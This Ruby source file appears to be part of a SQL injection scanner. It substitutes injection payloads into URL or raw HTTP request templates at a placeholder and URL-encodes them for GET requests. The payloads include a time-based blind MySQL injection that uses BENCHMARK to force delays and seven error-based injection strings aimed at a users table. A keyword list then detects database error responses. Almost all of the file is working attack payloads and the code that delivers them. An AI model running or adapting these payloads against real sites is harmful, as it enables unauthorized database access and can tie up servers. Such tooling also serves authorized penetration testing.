require 'open-uri'
module Approach1
  class ParametrizeTimeBasedURL
    def paraURL hURL
      hReturn = Hash.new
      string = "1' HAVING MAX(CASE WHEN 1=1 THEN BENCHMARK(50000000,ENCODE('foobar','barbaz')) ELSE 0 END) AND '1'='1"
      hURL.each do |key,target|
          if target[/GET.*HTTP/]
            target = target.gsub('X_param_X',URI::encode(string))
          else
            target = target.gsub('X_param_X',string)
          end
          hReturn[key] = target
      end
      return hReturn
    end
  end
  
  class ParametrizeErrorBasedURL
    def paraURL hURL
      hReturn,aTemp = Hash.new,Array.new
      strQueries = ["1' AND user_id IN (SELECT usuario FROM tabla) AND 'a'='a",
      "2' AND user_id IN (SELECT user FROM users u1,users u2) AND 'a'='a",
      "3' AND usuario = 'a",
      "'",
      "5' AND user_id IN (SELECT *) AND 'a'='a",
      "6' AND user_id IN (SELECT users.*) AND 'a'='a",
      "7' AND user_id IN (SELECT user_id FROM users GROUP BY COUNT(*)) AND 'a'='a"]
      strQueries.each do |string|
        hURL.each do |key,target|
          if target[/GET.*HTTP/]
              target = target.gsub('X_param_X',URI::encode(string))
            else
              target = target.gsub('X_param_X',string)
          end
            aTemp.push(target)
        end
      end
      aTemp.each_with_index {|value,index| hReturn[index]=value}
      return hReturn
    end
    
    def getkeywords
      return [
      #Regexp.new(/(^|[^\/<_-])error[s]?(\W|$)/i),
      Regexp.new(/(^|[^\/<_-])unknown[s]?(\W|$)/i),
      Regexp.new(/(^|[^\/<_-])issue[s]?(\W|$)/i),
      Regexp.new(/(^|[^\/<_-])problem[s]?(\W|$)/i),
      Regexp.new(/(^|[^\/<_-])line[s]?(\W|$)/i),
      Regexp.new(/(^|[^\/<_-])column[s]?(\W|$)/i),
      #Regexp.new(/(^|[^\/<_-])table[s]?(\W|$)/i),
      Regexp.new(/(^|[^\/<_-])invalid[s]?(\W|$)/i),
      Regexp.new(/(^|[^\/<_-])function[s]?(\W|$)/i),
      Regexp.new(/(^|[^\/<_-])usuario[s]?(\W|$)/i)]
    end
  end
end
